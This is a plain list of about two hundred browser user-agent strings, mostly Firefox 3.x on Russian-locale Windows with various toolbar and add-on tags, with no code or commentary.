Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03402) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100611 MRA 5.5 (build 02780) Firefox/3.6.4 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.6.6 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.1 WebMoney Advisor
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03278) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.3 (build 02564) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 MRA 5.4 (build 02647) Firefox/3.0.10 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 MRA 5.3 (build 02564) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02842) Firefox/3.0.19 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03278) Firefox/3.6.6 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.7 (build 03639) AskTbPTV/3.8.0.12304 Firefox/3.5.11 (.NET CLR 3.5.30729) sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03270) Firefox/3.5.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.7) Gecko/20070914 MRA 5.4 (build 02647) Firefox/2.0.0.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03637) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03402) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02812) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03686) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03649) Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091224 Firefox/3.5.6
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.4pre) Gecko/20090901 ALTLinux/Sisyphus/3.5.3-alt0.20090831 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) AskTbTKR/3.8.0.12304 Firefox/3.6.8 GTB7.1 ( .NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 WebMoney Advisor MRA 5.6 (build 03402);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 sputnik 2.2.0.34
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 AskTbNG2V5/3.8.0.12304 Firefox/3.5.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.66
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 AskTbTKR/3.8.0.12304 Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02842) AskTbPTV/3.8.0.12304 Firefox/3.0.19 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 (9B023D05-1B53-4751-FAB2-31FEA15E8790) Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03638) Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.7 (build 03639) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6pre) Gecko/20100624 Namoroka/3.6.6pre
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03402) Firefox/3.6.9 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03399) Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03402) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 Firefox/3.5.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.5 (build 02812) Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03658) Firefox/3.6.8 GTB7.1 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.5 (build 02842) Firefox/3.5.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.5 (build 02842) Firefox/3.6.9 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.6 (build 03402) Firefox/3.5.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03278) Firefox/3.6.9 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.7 (build 03672) Firefox/3.5.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03686) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 AskTbCS2/3.8.0.12304 Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.9) Gecko/20100824 AskTbFXTV5/3.8.0.12304 Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.7 (build 03639) Firefox/3.5.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03637) Firefox/3.6.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.6 (build 03278) Firefox/3.5.12 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03658) Firefox/3.6.8 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.5.13 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbFXTV5/3.8.0.12304 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03396) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 AskTbTKR/3.8.0.12304 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.4) Gecko/20100611 MRA 5.6 (build 03278) Firefox/3.6.4 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03402) Firefox/3.6.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AskTbBT3/3.8.0.12304 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.3 (build 02564) FireDownload/2.0.1 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbTRL/3.8.0.12304 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03270) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.3 (build 02564) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.7 (build 03672) Firefox/3.5.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03649) Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03402) Firefox/3.6.9 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.5 (build 02842) AskTbSTK/3.8.0.12304 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AskTbPTV/3.8.0.12304 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03686) Firefox/3.6 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.4 (build 02647) Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02776) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.7) Gecko/20100713 MRA 5.6 (build 03278) Firefox/3.6.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03637) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.5.13 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 AskTbDVSV5/3.8.0.12304 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) AskTbSPC2/3.8.0.12304 Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03270) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03638) Firefox/3.6.10 sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091224 MRA 5.5 (build 02842) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.86
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02812) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.5 (build 02842) Firefox/3.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.6.10 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.3.0.79
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03639) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02828) Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.4 (build 02647) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101001 MRA 5.5 (build 02842) Firefox/3.6.11 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 sputnik 2.2.0.35
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 (.NET CLR 3.5.30729) sputnik 2.3.0.88 uToolBar/0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.4 (build 02652) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.7) Gecko/20100713 MRA 5.7 (build 03686) Firefox/3.6.7 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.5.13 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) AskTbFXTV5/3.8.0.12304 Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AdCentriaIM/1.7 Firefox/3.6.10 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042310 Firefox/3.0.9
